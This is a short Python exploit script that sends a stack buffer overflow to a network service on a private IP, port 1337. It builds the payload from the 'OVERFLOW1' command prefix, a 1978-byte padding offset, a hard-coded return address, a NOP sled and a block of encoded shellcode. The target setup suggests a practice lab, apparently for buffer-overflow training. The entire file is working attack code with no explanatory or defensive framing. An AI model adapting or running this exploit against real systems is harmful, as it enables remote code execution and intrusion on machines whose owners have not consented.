#!/usr/bin/env python3

import socket

ip="10.10.22.218"
port=1337

prefix="OVERFLOW1 "
offset=1978
overflow="A" * offset
retn="\xaf\x11\x50\x62"
padding="\x90" * 32
payload=("\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\xdb\x27\x98\x39\x83\xee\xfc\xe2\xf4\x27\xcf\x1a\x39\xdb\x27"
"\xf8\xb0\x3e\x16\x58\x5d\x50\x77\xa8\xb2\x89\x2b\x13\x6b\xcf"
"\xac\xea\x11\xd4\x90\xd2\x1f\xea\xd8\x34\x05\xba\x5b\x9a\x15"
"\xfb\xe6\x57\x34\xda\xe0\x7a\xcb\x89\x70\x13\x6b\xcb\xac\xd2"
"\x05\x50\x6b\x89\x41\x38\x6f\x99\xe8\x8a\xac\xc1\x19\xda\xf4"
"\x13\x70\xc3\xc4\xa2\x70\x50\x13\x13\x38\x0d\x16\x67\x95\x1a"
"\xe8\x95\x38\x1c\x1f\x78\x4c\x2d\x24\xe5\xc1\xe0\x5a\xbc\x4c"
"\x3f\x7f\x13\x61\xff\x26\x4b\x5f\x50\x2b\xd3\xb2\x83\x3b\x99"
"\xea\x50\x23\x13\x38\x0b\xae\xdc\x1d\xff\x7c\xc3\x58\x82\x7d"
"\xc9\xc6\x3b\x78\xc7\x63\x50\x35\x73\xb4\x86\x4f\xab\x0b\xdb"
"\x27\xf0\x4e\xa8\x15\xc7\x6d\xb3\x6b\xef\x1f\xdc\xd8\x4d\x81"
"\x4b\x26\x98\x39\xf2\xe3\xcc\x69\xb3\x0e\x18\x52\xdb\xd8\x4d"
"\x69\x8b\x77\xc8\x79\x8b\x67\xc8\x51\x31\x28\x47\xd9\x24\xf2"
"\x0f\x53\xde\x4f\x92\x2b\x95\xf6\xf0\x3b\xdb\x23\x4a\xb0\x3d"
"\x4d\x88\x6f\x8c\x4f\x01\x9c\xaf\x46\x67\xec\x5e\xe7\xec\x35"
"\x24\x69\x90\x4c\x37\x4f\x68\x8c\x79\x71\x67\xec\xb3\x44\xf5"
"\x5d\xdb\xae\x7b\x6e\x8c\x70\xa9\xcf\xb1\x35\xc1\x6f\x39\xda"
"\xfe\xfe\x9f\x03\xa4\x38\xda\xaa\xdc\x1d\xcb\xe1\x98\x7d\x8f"
"\x77\xce\x6f\x8d\x61\xce\x77\x8d\x71\xcb\x6f\xb3\x5e\x54\x06"
"\x5d\xd8\x4d\xb0\x3b\x69\xce\x7f\x24\x17\xf0\x31\x5c\x3a\xf8"
"\xc6\x0e\x9c\x78\x24\xf1\x2d\xf0\x9f\x4e\x9a\x05\xc6\x0e\x1b"
"\x9e\x45\xd1\xa7\x63\xd9\xae\x22\x23\x7e\xc8\x55\xf7\x53\xdb"
"\x74\x67\xec")
postfix=""

buffer=prefix + overflow + retn + padding + payload + postfix

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except:
    print("Could not connect.")


